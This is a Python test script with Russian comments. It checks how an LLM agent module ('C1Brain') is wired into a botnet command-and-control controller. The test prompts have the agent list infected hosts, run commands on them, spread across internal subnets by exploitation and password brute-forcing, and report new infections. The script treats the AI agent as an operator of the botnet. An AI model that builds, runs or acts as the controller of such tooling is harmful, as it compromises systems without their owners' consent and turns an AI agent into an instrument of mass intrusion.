#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Тестирование интеграции между C1Brain и C2Controller

Этот скрипт демонстрирует, как LLM агент может управлять ботнетом и зондами
через интеграцию между модулями C1 и C2.
"""

import os
import sys
import json
import asyncio
import logging
from typing import Dict, List, Any

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='c1_c2_integration_test.log'
)
logger = logging.getLogger('IntegrationTest')

# Импортируем необходимые модули
from core.c1_brain import C1Brain
from core.c2_controller import C2Controller, C2API
from init_c2_integration import IntegrationManager, init_integration

async def test_integration_basic():
    """Базовое тестирование интеграции"""
    print("\n=== Базовое тестирование интеграции ===")
    
    # Создаем компоненты
    c1_brain = C1Brain()
    c2_controller = C2Controller()
    
    # Инициализируем интеграцию
    integration = IntegrationManager(c1_brain, c2_controller)
    integration.register_c2_tools()
    
    # Проверяем, что инструменты зарегистрированы
    tools = c1_brain.session_context["tools"]
    c2_tools = [name for name in tools if name.startswith("c2_")]
    print(f"Зарегистрированные инструменты C2 ({len(c2_tools)}):")
    for tool in c2_tools:
        print(f"  - {tool}")
    
    # Проверяем, что модуль зарегистрирован
    modules = c1_brain.get_registered_modules()
    print(f"\nЗарегистрированные модули ({len(modules)}):")
    for module_name, module_info in modules.items():
        print(f"  - {module_name}: {len(module_info['tools'])} инструментов")
    
    return c1_brain, c2_controller, integration

async def test_agent_query(c1_brain):
    """Тестирует запросы агента к ботнету"""
    print("\n=== Тестирование запросов агента ===")
    
    # Запросы для тестирования
    test_queries = [
        "Покажи список всех зондов в сети",
        "Какова статистика ботнета?",
        "Найди все агенты под управлением Windows",
        "Запусти распространение на подсеть 192.168.1.0/24",
        "Отправь команду whoami агенту с ID, который был первым в списке"
    ]
    
    # Выполняем запросы
    for i, query in enumerate(test_queries, 1):
        print(f"\nЗапрос {i}: {query}")
        response = await c1_brain.process_chat(query)
        print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")

async def test_complex_scenario(c1_brain):
    """Тестирует более сложный сценарий работы с ботнетом"""
    print("\n=== Тестирование сложного сценария ===")
    
    # Сценарий: сначала получаем агентов, затем запускаем команду на конкретном агенте
    # и затем проверяем статистику
    
    # Шаг 1: Получение списка агентов
    print("Шаг 1: Получение списка агентов")
    response = await c1_brain.process_chat("Покажи мне список всех активных агентов в ботнете")
    print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")
    
    # Шаг 2: Выбор первого агента и запуск команды
    print("\nШаг 2: Запуск команды на первом агенте")
    response = await c1_brain.process_chat("Выбери первого агента из списка и выполни на нем команду 'whoami'")
    print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")
    
    # Шаг 3: Получение статистики
    print("\nШаг 3: Получение статистики ботнета")
    response = await c1_brain.process_chat("Покажи статистику ботнета после выполнения предыдущих команд")
    print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")
    
    # Шаг 4: Распространение на новые цели
    print("\nШаг 4: Распространение на новые цели")
    response = await c1_brain.process_chat("Запусти распространение на подсеть 10.0.0.0/24 с использованием техник эксплуатации и подбора паролей")
    print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")
    
    # Шаг 5: Получение информации о заражениях
    print("\nШаг 5: Получение информации о заражениях")
    response = await c1_brain.process_chat("Покажи информацию о последних заражениях")
    print(f"Ответ: {response[:200]}..." if len(response) > 200 else f"Ответ: {response}")

async def main():
    """Основная функция тестирования"""
    print("=== Тестирование интеграции C1Brain и C2Controller ===\n")
    
    try:
        # Базовое тестирование
        c1_brain, c2_controller, integration = await test_integration_basic()
        
        # Тестирование запросов агента
        await test_agent_query(c1_brain)
        
        # Тестирование сложного сценария
        await test_complex_scenario(c1_brain)
        
        print("\n=== Тестирование завершено успешно ===")
        
    except Exception as e:
        logger.error(f"Error in test: {e}")
        print(f"\nОшибка при тестировании: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main()) 